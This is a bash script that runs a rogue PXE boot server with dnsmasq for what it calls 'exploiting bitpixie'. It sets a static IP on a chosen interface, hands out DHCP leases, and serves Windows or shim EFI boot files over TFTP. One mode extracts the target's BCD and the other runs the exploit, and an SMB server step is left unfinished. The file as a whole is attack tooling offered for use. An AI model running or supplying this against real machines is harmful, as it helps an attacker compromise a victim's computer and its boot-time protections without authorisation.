#!/bin/bash

function echo-info {
    echo -e "\e[34;1m[+]\e[0m \e[34mInfo: $1\e[0m" >&2
}

function echo-warning {
    echo -e "\e[31;1m[!] Warning: $1\e[0m" >&2
}

function printInfo {
  echo -e "\e[34;1mUsage:\e[0m"
  echo -e "\e[34;1m- Start server for extracting the BCD: \e[0m \e[34m$0 get-bcd <interface>\e[0m"
  echo -e "\e[34;1m- Start server for exploiting bitpixie:\e[0m \e[34m$0 exploit <interface>\e[0m"
  echo -e "\e[34;1m- Stop server:                        \e[0m  \e[34m$0 stop\e[0m"
}


# Function to start the servers
function start-servers {
  SCRIPTPATH="$( cd -- "$(dirname "$0")" >/dev/null 2>&1 ; pwd -P )"
  BOOTEFI=$1
  interface=$2

  if [[ "$interface" = "" ]]; then
    echo-warning "No interface specified!"
    printInfo
    exit
  fi

  # Add IP address to interface
  sudo ip a add 10.13.37.100/24 dev $interface
  echo-info "Interface $interface has IP address 10.13.37.100/24"

  stop-servers

  # Start dnsmasq
  echo-info "Starting dnsmasq..."
  sudo dnsmasq --no-daemon --interface=$interface --dhcp-range=10.13.37.100,10.13.37.101,255.255.255.0,1h --dhcp-boot=$BOOTEFI --enable-tftp --tftp-root=$SCRIPTPATH/PXE-Server

  # Start SMB Server
  echo-info "Starting SMB server..."
  # TODO: Actually add the SMB Server
  # smbserver.py smb $SCRIPTPATH/PXE-Server/Boot -smb2support
}


# Function to stop the servers
function stop-servers {
  echo-info "Killing all dnsmasq processes..."
  sudo killall dnsmasq
}



if [[ "$1" = "stop" ]]; then
  stop-servers $1
  exit
elif [[ "$1" = "get-bcd" ]]; then
  start-servers shimx64.efi $2
  exit
elif [[ "$1" = "exploit" ]]; then
  start-servers bootmgfw.efi $2
  exit
else
  printInfo
  exit
fi
